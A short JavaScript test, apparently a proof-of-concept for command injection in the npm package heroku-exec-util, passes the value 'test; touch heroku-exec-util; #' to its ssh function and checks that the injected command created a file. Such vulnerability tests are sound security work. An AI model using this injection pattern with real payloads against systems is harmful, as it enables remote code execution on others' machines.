//
test("Remote code execution in heroku-exec-util", () => {
  const fs = require("fs");
  const heu = require("heroku-exec-util");
  const path = "./heroku-exec-util";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    heu
      .ssh({ args: {} }, "test; touch heroku-exec-util; #", "", "test", {
        path: "test",
      })
      .then(() => {
        file_exist = fs.existsSync(path);
        expect(file_exist).toBe(true);
        fs.unlink(path, function (err) {});
      });
  } catch (error) {}
});
